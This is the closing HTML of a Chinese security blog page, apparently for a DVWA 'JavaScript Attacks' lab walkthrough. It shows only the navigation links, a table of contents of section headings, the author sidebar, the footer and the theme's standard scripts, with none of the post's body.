+    <a href="/2025/11/20/Cryptography_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/" rel="prev" title="DVWA - Cryptography (密码学) 攻防练习详解">
+      <i class="fa fa-chevron-left"></i> DVWA - Cryptography (密码学) 攻防练习详解
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2025/11/20/Insecure_CAPTCHA_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/" rel="next" title="DVWA - Insecure CAPTCHA (不安全的验证码) 攻防练习详解">
+      DVWA - Insecure CAPTCHA (不安全的验证码) 攻防练习详解 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95"><span class="nav-number">1.</span> <span class="nav-text">目录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="nav-number">2.</span> <span class="nav-text">漏洞简介</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFJavaScript-Attacks%EF%BC%88JavaScript%E6%94%BB%E5%87%BB%EF%BC%89%EF%BC%9F"><span class="nav-number">2.1.</span> <span class="nav-text">什么是JavaScript Attacks（JavaScript攻击）？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Low-%E9%9A%BE%E5%BA%A6"><span class="nav-number">3.</span> <span class="nav-text">Low 难度</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87"><span class="nav-number">3.1.</span> <span class="nav-text">攻击目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E7%AB%AF%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">3.2.</span> <span class="nav-text">前端代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">3.3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4"><span class="nav-number">3.4.</span> <span class="nav-text">攻击步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A41%EF%BC%9A%E6%9F%A5%E7%9C%8B%E6%BA%90%E4%BB%A3%E7%A0%81%E8%8E%B7%E5%8F%96token"><span class="nav-number">3.4.1.</span> <span class="nav-text">步骤1：查看源代码获取token</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A42%EF%BC%9A%E6%8F%90%E5%8F%96%E6%89%80%E6%9C%89%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="nav-number">3.4.2.</span> <span class="nav-text">步骤2：提取所有敏感信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A43%EF%BC%9A%E7%BB%95%E8%BF%87%E9%AA%8C%E8%AF%81%E7%9B%B4%E6%8E%A5%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0"><span class="nav-number">3.4.3.</span> <span class="nav-text">步骤3：绕过验证直接调用函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A44%EF%BC%9A%E7%A6%81%E7%94%A8JavaScript%E9%AA%8C%E8%AF%81"><span class="nav-number">3.4.4.</span> <span class="nav-text">步骤4：禁用JavaScript验证</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A45%EF%BC%9A%E5%88%A9%E7%94%A8eval-%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81"><span class="nav-number">3.4.5.</span> <span class="nav-text">步骤5：利用eval()执行任意代码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A46%EF%BC%9A%E6%8F%90%E5%8F%96%E5%AE%8C%E6%95%B4%E7%9A%84JavaScript%E4%BB%A3%E7%A0%81"><span class="nav-number">3.4.6.</span> <span class="nav-text">步骤6：提取完整的JavaScript代码</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Medium-%E9%9A%BE%E5%BA%A6"><span class="nav-number">4.</span> <span class="nav-text">Medium 难度</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87-1"><span class="nav-number">4.1.</span> <span class="nav-text">攻击目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E7%AB%AF%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-1"><span class="nav-number">4.2.</span> <span class="nav-text">前端代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B0%E5%A2%9E%E9%98%B2%E6%8A%A4"><span class="nav-number">4.3.</span> <span class="nav-text">新增防护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="nav-number">4.4.</span> <span class="nav-text">仍存在的漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="nav-number">4.5.</span> <span class="nav-text">绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9ABase64%E8%A7%A3%E7%A0%81"><span class="nav-number">4.5.1.</span> <span class="nav-text">方法1：Base64解码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9A%E5%8F%8D%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-number">4.5.2.</span> <span class="nav-text">方法2：反转字符串</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%953%EF%BC%9AXOR%E8%A7%A3%E5%AF%86"><span class="nav-number">4.5.3.</span> <span class="nav-text">方法3：XOR解密</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%954%EF%BC%9A%E5%8F%8D%E5%90%91%E6%9B%BF%E6%8D%A2"><span class="nav-number">4.5.4.</span> <span class="nav-text">方法4：反向替换</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%955%EF%BC%9A%E7%9B%B4%E6%8E%A5%E8%B0%83%E7%94%A8%E9%AA%8C%E8%AF%81%E5%87%BD%E6%95%B0%E6%B5%8B%E8%AF%95"><span class="nav-number">4.5.5.</span> <span class="nav-text">方法5：直接调用验证函数测试</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#High-%E9%9A%BE%E5%BA%A6"><span class="nav-number">5.</span> <span class="nav-text">High 难度</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87-2"><span class="nav-number">5.1.</span> <span class="nav-text">攻击目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E7%AB%AF%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-2"><span class="nav-number">5.2.</span> <span class="nav-text">前端代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B0%E5%A2%9E%E9%98%B2%E6%8A%A4-1"><span class="nav-number">5.3.</span> <span class="nav-text">新增防护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E6%BC%8F%E6%B4%9E-1"><span class="nav-number">5.4.</span> <span class="nav-text">仍存在的漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95-1"><span class="nav-number">5.5.</span> <span class="nav-text">绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9A%E5%8F%8D%E6%B7%B7%E6%B7%86%E5%B7%A5%E5%85%B7"><span class="nav-number">5.5.1.</span> <span class="nav-text">方法1：反混淆工具</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9A%E8%B0%83%E8%AF%95%E5%99%A8%E6%96%AD%E7%82%B9"><span class="nav-number">5.5.2.</span> <span class="nav-text">方法2：调试器断点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%953%EF%BC%9A%E7%9B%B4%E6%8E%A5%E8%B0%83%E7%94%A8%E8%A7%A3%E5%AF%86%E5%87%BD%E6%95%B0"><span class="nav-number">5.5.3.</span> <span class="nav-text">方法3：直接调用解密函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%954%EF%BC%9A%E8%BF%90%E8%A1%8C%E6%97%B6%E6%8B%A6%E6%88%AA"><span class="nav-number">5.5.4.</span> <span class="nav-text">方法4：运行时拦截</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Impossible-%E9%9A%BE%E5%BA%A6"><span class="nav-number">6.</span> <span class="nav-text">Impossible 难度</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87-3"><span class="nav-number">6.1.</span> <span class="nav-text">攻击目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E5%90%8E%E7%AB%AF%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">6.2.</span> <span class="nav-text">前后端代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%8C%E5%96%84%E7%9A%84%E9%98%B2%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="nav-number">6.3.</span> <span class="nav-text">完善的防护机制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%97%A0%E6%B3%95%E6%94%BB%E7%A0%B4%EF%BC%9F"><span class="nav-number">6.4.</span> <span class="nav-text">为什么无法攻破？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="nav-number">7.</span> <span class="nav-text">防御建议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%B6%E6%9E%84%E5%B1%82%E9%9D%A2"><span class="nav-number">7.1.</span> <span class="nav-text">架构层面</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E6%B0%B8%E8%BF%9C%E4%B8%8D%E4%BF%A1%E4%BB%BB%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="nav-number">7.1.1.</span> <span class="nav-text">1. 永远不信任客户端</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF"><span class="nav-number">7.1.2.</span> <span class="nav-text">2. 敏感数据和逻辑在服务器端</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E5%AE%9E%E6%96%BD%E9%80%82%E5%BD%93%E7%9A%84%E9%99%90%E6%B5%81"><span class="nav-number">7.1.3.</span> <span class="nav-text">3. 实施适当的限流</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%B1%82%E9%9D%A2"><span class="nav-number">7.2.</span> <span class="nav-text">代码层面</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E9%81%BF%E5%85%8D%E5%9C%A8JavaScript%E4%B8%AD%E5%AD%98%E5%82%A8%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="nav-number">7.2.1.</span> <span class="nav-text">1. 避免在JavaScript中存储敏感信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%AA%8C%E8%AF%81%E4%BB%85%E7%94%A8%E4%BA%8E%E7%94%A8%E6%88%B7%E4%BD%93%E9%AA%8C"><span class="nav-number">7.2.2.</span> <span class="nav-text">2. 客户端验证仅用于用户体验</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E4%BD%BF%E7%94%A8%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AD%98%E5%82%A8%E7%A7%98%E5%AF%86"><span class="nav-number">7.2.3.</span> <span class="nav-text">3. 使用环境变量存储秘密</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-%E5%AE%9E%E6%96%BD%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5%EF%BC%88CSP%EF%BC%89"><span class="nav-number">7.2.4.</span> <span class="nav-text">4. 实施内容安全策略（CSP）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%91%E6%8E%A7%E5%B1%82%E9%9D%A2"><span class="nav-number">7.3.</span> <span class="nav-text">监控层面</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95"><span class="nav-number">7.3.1.</span> <span class="nav-text">1. 日志记录</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%BC%82%E5%B8%B8%E6%A3%80%E6%B5%8B"><span class="nav-number">7.3.2.</span> <span class="nav-text">2. 异常检测</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93%E5%AF%B9%E6%AF%94"><span class="nav-number">8.</span> <span class="nav-text">总结对比</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E6%88%98%E5%BB%BA%E8%AE%AE"><span class="nav-number">9.</span> <span class="nav-text">实战建议</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="caixuya"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">caixuya</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">46</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Caixuya" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Caixuya" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:214089030@qq.com" title="E-Mail → mailto:214089030@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">粤ICP备20064368号-1 </a>
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">caixuya</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">374k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">5:40</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/undefined/anime.min.js"></script>
+  <script src="/undefined/pjax/pjax.min.js"></script>
+  <script src="//cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/fancybox/2.1.5/jquery.fancybox.pack.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script>
+<script src="//cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script>
+<script src="/js/algolia-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+    </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
